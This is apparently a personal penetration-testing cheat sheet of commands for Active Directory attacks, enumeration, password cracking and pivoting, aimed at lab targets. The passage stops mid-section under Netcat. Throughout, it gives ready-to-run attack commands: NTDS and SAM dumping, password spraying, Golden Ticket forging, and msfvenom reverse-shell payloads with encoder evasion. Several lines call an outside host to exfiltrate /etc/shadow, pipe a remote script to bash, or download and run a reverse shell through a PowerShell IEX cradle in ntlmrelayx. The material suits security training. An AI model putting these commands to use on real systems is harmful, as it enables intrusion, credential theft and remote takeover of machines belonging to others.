- [Amass](#amass)
- [Arp-scan](#arp-scan)
- [BloodHound & Neo4j](#bloodhound--neo4j)
	- [SharpHound](#sharphound)
	- [bloodhound.py](#bloodhoundpy)
	- [Upload the zip file into the BloodHound GUI](#upload-the-zip-file-into-the-bloodhound-gui)
	- [Search in BloodHound](#search-in-bloodhound)
	- [Remove connections and nodes](#remove-connections-and-nodes)
- [Braa](#braa)
- [CeWL](#cewl)
- [Chisel](#chisel)
- [CrackMapExec / NetExec](#crackmapexec--netexec)
- [Curl](#curl)
- [Dig](#dig)
- [Dnsenum](#dnsenum)
- [Enum4linux-ng](#enum4linux-ng)
- [Evil-WinRM](#evil-winrm)
- [Ffuf](#ffuf)
	- [Find directories](#find-directories)
	- [Find files](#find-files)
- [Fping](#fping)
- [GoBuster](#gobuster)
- [Hashcat](#hashcat)
	- [Writing custom wordlists and rules](#writing-custom-wordlists-and-rules)
- [Hydra](#hydra)
	- [Bruteforce http custom login panel](#bruteforce-http-custom-login-panel)
- [Impacket Suite](#impacket-suite)
	- [psexec](#psexec)
	- [wmiexec](#wmiexec)
	- [smbserver (SMB server on attacker)](#smbserver-smb-server-on-attacker)
	- [mssqlclient](#mssqlclient)
	- [samrdump](#samrdump)
	- [GetNPUsers (AS-REP Roasting)](#getnpusers-as-rep-roasting)
	- [GetUserSPNs (Kerberoasting)](#getuserspns-kerberoasting)
	- [ticketer (Golden Ticket)](#ticketer-golden-ticket)
	- [ntlmrelayx](#ntlmrelayx)
- [John The Ripper](#john-the-ripper)
	- [Cracking files](#cracking-files)
- [Kerbrute](#kerbrute)
- [Ldapsearch](#ldapsearch)
	- [Graphical tool | apache directory studio](#graphical-tool--apache-directory-studio)
- [Ldapdomaindump](#ldapdomaindump)
- [Lftp](#lftp)
- [Ligolo-ng](#ligolo-ng)
- [Metasploit](#metasploit)
	- [Database](#database)
	- [Sessions](#sessions)
	- [Jobs](#jobs)
	- [Meterpreter](#meterpreter)
	- [Useful Plugins](#useful-plugins)
- [Msfvenom](#msfvenom)
- [MySQL Client](#mysql-client)
- [Netcat & Ncat](#netcat--ncat)
- [Nikto](#nikto)
- [Nmap](#nmap)
	- [Basic Scans](#basic-scans)
	- [Host Discovery](#host-discovery)
	- [CopyPorts](#copyports)
	- [Scripts by Service](#scripts-by-service)
	- [IDS/IPS Evasion](#idsips-evasion)
- [ODAT (Oracle)](#odat-oracle)
- [Onesixtyone](#onesixtyone)
- [OpenSSL](#openssl)
- [Proxychains](#proxychains)
- [RDP Clients](#rdp-clients)
	- [xfreerdp](#xfreerdp)
	- [rdesktop](#rdesktop)
	- [rdp-sec-check](#rdp-sec-check)
- [Responder / Inveigh](#responder--inveigh)
	- [Responder](#responder)
	- [Inveigh (Windows)](#inveigh-windows)
- [Rpcclient](#rpcclient)
- [Rsync](#rsync)
- [Shells](#shells)
	- [Reverse Shell](#reverse-shell)
	- [Bind Shell](#bind-shell)
	- [Web Shell](#web-shell)
	- [Upgrading TTY](#upgrading-tty)
	- [Payload in Windows](#payload-in-windows)
	- [Useful resources](#useful-resources)
	- [Useful tips](#useful-tips)
- [Smbclient](#smbclient)
- [Smbmap](#smbmap)
- [Smtp-user-enum](#smtp-user-enum)
- [Snmpwalk](#snmpwalk)
- [Socat](#socat)
- [SQLplus (Oracle)](#sqlplus-oracle)
- [SSH](#ssh)
	- [Kerberos SSH](#kerberos-ssh)
	- [SSH Port Forwarding](#ssh-port-forwarding)
	- [SCP](#scp)
	- [SSH bruteforce](#ssh-bruteforce)
	- [SSH enumerate users > 7.7](#ssh-enumerate-users--77)
- [Sshuttle](#sshuttle)
- [Subfinder](#subfinder)
- [Wafw00f](#wafw00f)
- [Whatweb](#whatweb)
- [Wireshark & Tcpdump](#wireshark--tcpdump)
- [File Transfer Methods](#file-transfer-methods)
	- [Python HTTP Server](#python-http-server)
	- [Upload Server (uploadserver)](#upload-server-uploadserver)
	- [Nginx PUT Upload (receive files over HTTP)](#nginx-put-upload-receive-files-over-http)
	- [PowerShell Downloads](#powershell-downloads)
	- [Changing User Agent](#changing-user-agent)
	- [Base64 (bypass firewall)](#base64-bypass-firewall)
	- [SMB](#smb)
	- [FTP](#ftp)
	- [Linux Direct Downloads](#linux-direct-downloads)
	- [WebDAV (SMB upload over HTTP)](#webdav-smb-upload-over-http)
	- [Encrypted Transfers](#encrypted-transfers)
	- [Multi-Language Downloads](#multi-language-downloads)
	- [LOLBins for File Transfer (Windows)](#lolbins-for-file-transfer-windows)
- [Windows Port Forwarding](#windows-port-forwarding)
	- [Netsh](#netsh)
	- [Plink.exe (PuTTY)](#plinkexe-putty)
	- [Rpivot](#rpivot)
	- [DNScat2](#dnscat2)
	- [Ptunnel-ng (ICMP tunneling)](#ptunnel-ng-icmp-tunneling)
	- [SocksOverRDP](#socksoverrdp)
- [System Commands](#system-commands)
	- [Windows](#windows)
	- [Linux](#linux)
	- [Important Paths](#important-paths)
- [NFS](#nfs)
- [SMTP / IMAP / POP3](#smtp--imap--pop3)
	- [SMTP Apache James Server 2.3.2](#smtp-apache-james-server-232)
		- [Interact IMAP with TLS](#interact-imap-with-tls)
		- [IMAP commands](#imap-commands)
- [MySQL (Advanced)](#mysql-advanced)
- [MSSQL](#mssql)
- [IPMI](#ipmi)
- [R-services (rlogin / rwho / rusers)](#r-services-rlogin--rwho--rusers)
- [WMI / wmiexec](#wmi--wmiexec)
- [Rubeus](#rubeus)
- [PowerView](#powerview)
- [SharpView](#sharpview)
- [Windapsearch](#windapsearch)
- [Debugging Binaries](#debugging-binaries)
	- [strings](#strings)
	- [Executing the file](#executing-the-file)
	- [ltrace](#ltrace)
	- [strace](#strace)
	- [objdump](#objdump)
	- [gdb](#gdb)
	- [Ghidra](#ghidra)
		- [Arch bug](#arch-bug)
		- [Installing jdk debian](#installing-jdk-debian)
		- [Creating a project](#creating-a-project)
		- [Configurations](#configurations)
	- [What can you search?](#what-can-you-search)
		- [Imports](#imports)
		- [Strings](#strings)
		- [Entry point](#entry-point)
	- [Decompile function](#decompile-function)
	- [For .NET or C# binaries](#for-net-or-c-binaries)
		- [Avaloniailspy / ILSpy](#avaloniailspy--ilspy)
		- [dnspy](#dnspy)
- [Useful resources for AD](#useful-resources-for-ad)
- [DomainPasswordSpray](#domainpasswordspray)
- [LAPSToolkit](#lapstoolkit)
- [DNScat2](#dnscat2)
- [ptunnel-ng (ICMP Tunneling)](#ptunnel-ng-icmp-tunneling)
- [SocksOverRDP](#socksoverrdp)
- [Nessus](#nessus)
- [OpenVAS / GVM](#openvas--gvm)
- [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
- [Shares](#shares)
- [Snaffler](#snaffler)


---

## Amass

```bash
amass enum -passive -d ingenero.es
```

---

## Arp-scan

```bash
sudo arp-scan -I tun0 --localnet
```

---

## BloodHound & Neo4j

If you don't have more idea about what to do in a domain, you can use bloodhound & neo4j to obtain more information about.

BloodHound: Is a tool that analyze relationship in AD and find different ways to do a privilage escalation.
neo4j is a database of graph

If you have problems installing you have change the version of java to **11**:
```bash
update-alternatives --config java
```

In Arch Linux:
```bash
archlinux-java status
```

```bash
sudo archlinux-java set java-11-openjdk 
```

Remember which version of java you were using before so you can go back to it.

Start the server of neo4j:
```bash
sudo systemctl start neo4j
```

Login in the localhost:7474, use default credentials, neo4j:neo4j, change the password.

```bash
bloodhound &>/dev/null &
disown
```

If you have problems with the password, you can reset the password.

delete the file:
```bash
sudo trash-put /var/lib/neo4j/data/dbms/auth.ini
```

If you have problem when start the service, you can check and change the permissions:

```bash
sudo chown -R neo4j:neo4j /var/log/neo4j
sudo chown -R neo4j:neo4j /var/lib/neo4j
sudo chown -R neo4j:neo4j /var/run/neo4j 2>/dev/null
```

Remember that when you change the password for the first time, this need to have more than 8 characters:
org.neo4j.commandline.admin.security.exception.InvalidPasswordException: A password must be at least 8 characters.

You can stop the neo4j services and delete the database.

```bash
sudo rm -rf /var/lib/neo4j/data/databases/system
```

```bash
sudo rm -rf /var/lib/neo4j/data/transactions/system 
```

And the auth file.
```bash
sudo rm -f /var/lib/neo4j/data/dbms/auth /var/lib/neo4j/data/dbms/auth.ini
```

Start the service.

You need to upload a ZIP.

You can use an executable [SharpHound](https://github.com/puckiestyle/powershell/blob/master/Sharphound.exe) or a powershell script [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1) inside the victim machine. You need to have a **powershell session** and upload the file.

1. You have to run the script or download with IEX(New-Object...).
2. Search the function about bloodhound and how use it

```
cat SharpHound.ps1 | grep function
cat SharpHound.ps1 | grep Invoke-BloodHound
```

3. When you found the function, you have to import the module:

```
Import-Module .\SharpHound.ps1
```

4. Then you can use this command and automatically create a zip.
```powershell
Invoke-BloodHound -CollectionMethod All
```

Now you have to download the zip

In evil-winrm session:
```
download "C:/Windows/Temp/test/20250701170038_BloodHound.zip" bloodhound.zip
```

Move the zip file to your attacker machine and upload the ZIP to bloodhound.
If you click in the left top menu > Analysis >

### SharpHound

Is a C# data collector, is intended to be executed on a domain-joined Windows system.

Move the file to a domained-joined host.

```
.\SharpHound.exe --help
```

Run the SharpHound.exe collection from host:

```
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### bloodhound.py

https://github.com/dirkjanm/bloodhound.py

At the first, you need to have access to a victim machine.
Then, a community member release a python port which obtain data with valid credentials but without access.

This help us not have to run the collector from a domain host, which can be potentially blocked or set off alerts, but is not the best stealthy method.

To see the options:
```
bloodhound-python -h
```

Executing bloodhound-python or bloodhound.py
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all --zip
```

- `-ns`: Specify the nameserver as the Domain Controller
- `-c all` told the tool to run all checks.

One time the script finishes, we will see the output files in the current working directory in the format `date_object.json`

### Upload the zip file into the BloodHound GUI

Start the neo4j service, firing up the database an load the data.

```bash
sudo neo4j start
```

Now, you can write bloodhound to start the program.

Default credentials: neo4j/neo4j or randomly generated password for the username admin for modern community edition

We need to create a zip with all the json files:

```bash
zip -r ilfreight_bh.zip *.json
```

To upload the zip:

![Pasted image 20260726170043.png](images/Pasted%20image%2020260726170043.png)

Now the data is uploaded. We can use the analyze tab to run queries against the database.

These queries can be custom using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/).  Also we can use **built-in path finding** queries on the Analysis tab on the left side of the windows.

You have the query `Find Shortest Paths To Domain Admins` will give us any logical paths to escalate to Domain Administrator privileges or equivalent.

Another feature is that in the `Database Info` tab after uploading data, search for a node such as `Domain Users`, and scroll through of all options under the `Node Info` tab.

To use custom queries you need to pasting into the `Raw Query` box.

### Search in BloodHound

In the search bar on the top left you can type: `domain:` and choose the domain.

In the Analysis tab you can find pre-built queries. You can use the query `Find Computers with Unsupported Operating Systems` for finding outdated and unsupported operating system running legacy software.

We can use the query `Find Computers where Domain Users are Local Admin` to see if there are any hosts where all users have local admin rights.

Right click in the relationship, help and you will obtain more information.

### Remove connections and nodes

Go to http://localhost:7474
Add the credentials
Do the following query to delete all:

```
MATCH (n) DETACH DELETE n
```

---

## Braa

Brute-force SNMP OIDs with a known community string:
```bash
braa <community_string>@<IP>:.1.3.6.*
braa public@10.129.14.128:.1.3.6.*
```

---

## CeWL

Generate wordlist from a corporate website:
```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

---

## Chisel

Build (requires Go):
```bash
git clone https://github.com/jpillora/chisel.git
cd chisel && go build
```

Transfer to pivot:
```bash
scp chisel ubuntu@10.129.202.64:~/
```

Direct mode (server on victim):
```bash
# On pivot (victim)
./chisel server -v -p 1234 --socks5

# On attacker
./chisel client -v 10.10.14.17:1234 R:socks
```

Reverse pivot (to bypass firewall):
```bash
# On attacker
sudo ./chisel server --reverse -v -p 1234 --socks5

# On victim
./chisel client -v 10.10.14.17:1234 R:socks
```

Configure proxychains after starting chisel:
```
socks5 127.0.0.1 1080
```

---

## CrackMapExec / NetExec

Basic host info:
```bash
crackmapexec smb 10.10.10.10
```

Verify credentials:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password'
```

List shares:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --shares
```

Scan network:
```bash
crackmapexec smb 10.10.10.10/24
```

Domain users:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --users
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Groups:
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Logged-on users:
```bash
crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Spider shares:
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

Enable RDP:
```bash
crackmapexec smb 10.10.10.0/24 -u 'Administrator' -p 'password' -M rdp -o action=enable
```

Dump NTDS (DC admin):
```bash
crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'password' --ntds vss
```

Dump SAM:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -d 'domain.local' --sam
```

Brute force:
```bash
crackmapexec smb 10.10.10.10 -u 'bob' -p /usr/share/wordlist/rockyou.txt
```

Local authentication:
```bash
netexec smb 10.129.35.14 -u 'bob' -p 'Welcome1' --shares --local-auth
```

Kerberos authentication:
```bash
crackmapexec smb 10.10.10.175 -u 'fsmith' -p '' -d EGOTISTICALBANK --kerberos
```

Password spraying:
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <hash> | grep +
```

Password policy:
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

WinRM:
```bash
netexec winrm 10.10.10.175 -u 'user' -p 'password'
```

---

## Curl

HTTP banner:
```bash
curl -I inlanefreight.com
curl -IL https://www.inlanefreight.com
```

IMAP:
```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd -v
```

Upload file:
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

Web shell:
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

Fileless attack:
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Subdomains via crt.sh:
```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

---

## Dig

Generic query:
```bash
dig any inlanefreight.com
dig @10.10.10.224 realcorp.htb
dig @10.10.10.224 realcorp.htb ns
dig @10.10.10.224 realcorp.htb mx
```

SOA, NS, TXT:
```bash
dig soa www.sergiky.github.io
dig ns inlanefreight.htb @10.129.14.128
dig CH TXT version.bind 10.129.120.85
```

Zone transfer:
```bash
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.56.224
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

Reverse lookup:
```bash
dig -x 134.209.24.248
```

Subdomain brute force:
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

---

## Dnsenum

```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

---

## Enum4linux-ng

Full enumeration:
```bash
enum4linux-ng 10.10.10.10
```

Password policy only:
```bash
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

Users only:
```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

---

## Evil-WinRM

```bash
evil-winrm -u 'user' -p 'password'
```

With Docker:
```bash
docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ps1_scripts/' -e '/exe_files/'
```

Python version:
```bash
pipx install evil-winrm-py
```

---

## Ffuf

Subdomains via vhost fuzzing:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" | grep -vE "Words: 186"
```

### Find directories

```
ffuff -w <wordlist> -u http://<IP/FUZZ/> -fw 525
```

- `-fw 525` is to hidde the first comments. You have to indicate the words that show the comments.

### Find files

```
ffuff -w <wordlist> -u http://<IP/FUZZ> -fw 525 -e .bak,.js,.html,.txt
```

---

## Fping

```bash
fping -asgq 172.16.5.0/23
```
Flags: `-a` (alive hosts), `-s` (stats), `-g` (generate list from CIDR), `-q` (no per-host output)

---

## GoBuster

Directories:
```bash
gobuster dir -u https://10.10.10.10/ -w /usr/share/wordlist/seclists/Discovery/Web-Content/common.txt
```

Virtual hosting:
```bash
gobuster vhost -u http://<target_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
gobuster vhost -u http://inlanefreight.htb:1234 -w ...
gobuster vhost -u http://siteisup.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
```

DNS:
```bash
gobuster dns -d 154.57.164.62:32148 -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
```

Useful flags: `-t` (threads), `-k` (ignore SSL), `-o` (output to file)

---

## Hashcat

General syntax:
```bash
hashcat -a <mode> -m <hash_type> <hashes> [wordlist/mask/...]
```

Identify hash type:
```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
hashid -j 193069ceb0461e1d40d216e32c79c704
```

Dictionary attack (`-a 0`):
```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Mask attack (`-a 3`):
```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

| Mask | Charset |
|------|---------|
| `?l` | abcdefghijklmnopqrstuvwxyz |
| `?u` | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `?d` | 0123456789 |
| `?h` | 0123456789abcdef |
| `?H` | 0123456789ABCDEF |
| `?s` | special characters |
| `?a` | ?l?u?d?s |
| `?b` | 0x00 - 0xff |

IPMI hashes (mode 7300):
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### Writing custom wordlists and rules

Many employees choose passwords that include the company's name. References to pets, friends, sports, hobbies, and other aspects of daily life.

Commonly, users use the following password to fit the most common policies:

| Description                           | Password Syntax  |
| :------------------------------------ | :--------------- |
| First letter is uppercase             | `Password`       |
| Adding numbers                        | `Password123`    |
| Adding year                           | `Password2022`   |
| Adding month                          | `Password02`     |
| Last character is an exclamation mark | `Password2022!`  |
| Adding special characters             | `Password@2022!` |

To create custom wordlists you can use rules:

| Función | Descripción                                      |
| :------ | :----------------------------------------------- |
| .       | Do nothing                                       |
| l       | Lowercase all letters                            |
| u       | Uppercase all letters                            |
| c       | Capitalize the first letter and lowercase others |
| sXY     | Replace all instances of X with Y                |
| $!      | Add the exclamation character at the end         |

Each rule is written on a new line

```bash
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

We can use the following command to apply the rules in custom.rule to each word in password.list and store the mutated results in mut_password.list
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Example of the output:
```bash
cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

Rules location: `/usr/share/hashcat/rules`

---

## Hydra

### Bruteforce http custom login panel

```bash
hydra -l prtgadmin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 10.129.230.176 http-post-form "/public/checklogin.htm:username=^USER^&password=^PASS^:F=failed" -v
```

Indicate the POST parameters, username=...
`-F`: Indicate a word that appear in the response that indicate that is not correct.

---

## Impacket Suite

### psexec

If you have a pwned in crackmapexec and winrm service is disabled you can use **impacket-psexec** to open a session. Sometime when the password have special characters used in bash you have to escaped:

```bash
impacket-psexec domain.htb/user:password@10.10.10.10 cmd.exe
```

With the NTLM hash
```
impacket-psexec domain.htb/user@10.10.10.10 -hashes :<NT_HASH>
```

In the help panel you will see that need the LM hash, but is not necessary if you put in blank.

Another way:
```bash
impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrat
```

### wmiexec
```bash
impacket-wmiexec.py domain.local/user@IP -hashes <hash>
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

### smbserver (SMB server on attacker)
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
impacket-smbserver share -smb2support /tmp/smbshare
impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### mssqlclient
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

### samrdump
```bash
samrdump.py 10.129.14.128
```

### GetNPUsers (AS-REP Roasting)
```bash
impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt
```

### GetUserSPNs (Kerberoasting)
```bash
impacket-GetUserSPNs domain.htb/user:password
impacket-GetUserSPNs domain.htb/user:password -request
```

### ticketer (Golden Ticket)
```bash
impacket-ticketer -nthash <hash_krbtgt> -domain-sid S-1-5... -domain domain.local Administrator
export KRB5CCNAME="/home/sergiky/Desktop/AD/GoldenTicket/Administrator.ccache"
psexec.py -n -k domain.local/Administrator@<DC-hostname> cmd.exe
```

### ntlmrelayx
```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -6 -wh 10.10.10.10 -t smb://10.10.10.15 -socks -debug -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/revshell.ps1')"
```

---

## John The Ripper

Single crack mode is a rule-based cracking useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory, geocos values.

Example with the passwd file with the following content:
```bash
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bas
```

The tool will use `r0lf`, `Rolf Sebastian` and `/home/r0lf` to generate candidate passwords
```bash
john --single passwd
```

With wordlist:
```bash
john --wordlist=<wordlist> <hash_file>
john --wordlist=rockyou.txt hashes
```

Identify hash format:
```bash
hashid -j 193069ceb0461e1d40d216e32c79c704
```

Also you can see:
- https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
- https://openwall.info/wiki/john/sample-hashes

Specify format:
```bash
john --format=zip [...] <hash_file>
```

### Cracking files

You can use tools such as `pdf2john` to convert a file with password to a john format

| Herramienta             | Descripción                                   |
| :---------------------- | :-------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

You can find more if you use **locate \*2john\***

Find converters:
```bash
locate *2john*
```

---

## Kerbrute

Download: https://github.com/ropnop/kerbrute/releases/latest

Build:
```bash
git clone https://github.com/ropnop/kerbrute.git && make all
```

Enumerate valid users:
```bash
kerbrute userenum --dc 10.10.10.10 -d domain.htb /usr/share/wordlists/seclists/Usernames/Names/names.txt -o valid_ad_users
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Password spraying:
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

---

## Ldapsearch

Naming contexts:
```bash
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
```

Dump full domain:
```bash
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

Password policy (anonymous bind):
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Users (anonymous bind):
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

Search all items (with credentials):
```bash
ldapsearch -h support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"| less
```

### Graphical tool | apache directory studio

LDAP > new connection

hostname: support.htb (added to /etc/hosts)

Bind DN or user: ldap@support.htb
Password: password

One time introduced, on the left side you have a view tree icon of ldap.

Then you can start searching.

For find users you can go to DC=support, DC=htb (16) > CN=users

---

## Ldapdomaindump

Requires valid credentials:
```bash
service apache2 start
python3 ldapdomaindump -u 'domain.local\user' -p 'password' 10.10.10.10
```

---

## Lftp

Download all files from ftp server
```
lftp <ip>
mirror -a
```

---

## Ligolo-ng

Recommended for OSCP (faster than pure proxychains).

> Shares a port with BloodHound — change if necessary.
> With nmap use `--unprivileged` or `-PE` to avoid false positives.

---

## Metasploit

Launch:
```bash
msfconsole
msfconsole -q
```

Search:
```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Basic commands:
```
use <module>
options
info
set RHOSTS x
setg RHOSTS x
run / exploit
show targets
show payloads
show encoders
```

### Database
```bash
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
```

Inside msfconsole:
```bash
workspace -a Target_1
db_import Target.xml
db_nmap -sV -sS 10.10.10.8
hosts -h
services -h
creds -h
loot -h
```

### Sessions
```bash
sessions           # list
sessions -i 1      # use
sessions -u 1      # upgrade to meterpreter
Ctrl+Z             # background
```

### Jobs
```bash
exploit -j          # run in background
jobs -h
kill <index>
```

### Meterpreter
```bash
getuid
ps
steal_token <PID>
hashdump
lsa_dump_sam
lsa_dump_secrets
db_nmap -sV -p- -T5 -A 10.10.10.15
```

Find privilege escalation exploits:
```bash
use post/multi/recon/local_exploit_suggester
```

Ping sweep from meterpreter:
```bash
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Autoroute (pivoting):
```bash
run autoroute -s 172.16.5.0/23
run autoroute -p
```

SOCKS proxy:
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Portfwd:
```bash
portfwd add -l 3300 -p 3389 -r 172.16.5.19
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

IPMI:
```bash
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

MSSQL:
```bash
use auxiliary/scanner/mssql/mssql_ping
```

### Useful Plugins

- Railgun
- Darkoperator's

---

## Msfvenom

Reverse HTTPS (Windows x64):
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> -f exe -o backupscript.exe LPORT=8080
```

Reverse TCP (Windows x64):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Bind shell:
```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

Generic x86:
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Check payload against AV:
```bash
msf-virustotal -k <API_key> -f payload.exe
```

---

## MySQL Client

```bash
mysql -u root -h 10.129.14.132
mysql -u root -pP4SSw0rd -h 10.129.14.12
```

Nmap scripts:
```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

Useful commands:

| Command | Description |
|---------|-------------|
| `show databases;` | List databases |
| `use <database>;` | Select DB |
| `show tables;` | List tables |
| `show columns from <table>;` | View columns |
| `select * from <table>;` | Everything from a table |

System connections (lateral movement):
```mysql
use sys;
select host, unique_users from host_summary;
```

---

## Netcat & Ncat

Listener:
```bash
nc -nlvp 443
rlwrap nc -nlvp 4646
```

Banner grabbing:
```bash
nc -nv 10.129.42.253 21
```

File transfer:
```bash
# Receiver
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe

# Sender
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
